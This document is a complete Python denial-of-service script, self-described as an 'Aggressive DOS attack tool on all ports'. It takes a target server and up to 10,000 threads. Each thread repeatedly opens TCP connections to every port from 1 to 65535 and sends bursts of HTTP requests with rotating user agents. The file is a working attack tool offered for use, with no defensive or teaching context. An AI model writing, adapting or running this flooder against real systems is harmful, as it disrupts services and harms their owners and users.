import sys
import socket
import random
import threading
import time
import argparse
from queue import Queue

USER_AGENTS = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0"
]

def random_user_agent():
    return random.choice(USER_AGENTS)

def random_headers(host):
    headers = [
        f"GET / HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {random_user_agent()}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache"
    ]
    return "\r\n".join(headers) + "\r\n\r\n"

def flood(host, port):
    data = random_headers(host).encode('utf-8')
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((host, port))
            # Send a burst of packets quickly per connection
            for _ in range(10):
                sock.sendall(data)
            sock.shutdown(socket.SHUT_WR)
            sock.close()
            print(f"[+] Flooded {host}:{port}")
            time.sleep(0.01)  # small delay to keep CPU usable
        except Exception as e:
            # Uncomment for debug: print(f"[-] Error flooding {host}:{port} -> {e}")
            time.sleep(0.05)

def worker(host, port_queue):
    while True:
        try:
            port = port_queue.get(timeout=1)
            flood(host, port)
            port_queue.task_done()
        except Exception:
            # Queue empty or timeout, refill ports
            while port_queue.empty():
                for p in range(1, 65536):
                    port_queue.put(p)

def main():
    parser = argparse.ArgumentParser(description="Aggressive DOS attack tool on all ports")
    parser.add_argument("-s", "--server", help="Target server IP or hostname", required=True)
    parser.add_argument("-t", "--threads", type=int, default=500, help="Number of threads (default 500, max 10000)")
    args = parser.parse_args()

    host = args.server
    threads = args.threads

    if threads > 10000:
        print("[!] Max threads is 10000")
        threads = 10000

    # Resolve hostname to IP
    try:
        host_ip = socket.gethostbyname(host)
    except Exception as e:
        print(f"[!] Could not resolve host {host}: {e}")
        sys.exit(1)

    port_queue = Queue()
    for p in range(1, 65536):
        port_queue.put(p)

    print(f"Starting aggressive attack on {host} ({host_ip}) on all ports with {threads} threads...")

    for _ in range(threads):
        t = threading.Thread(target=worker, args=(host_ip, port_queue))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        sys.exit()

if __name__ == "__main__":
    main()
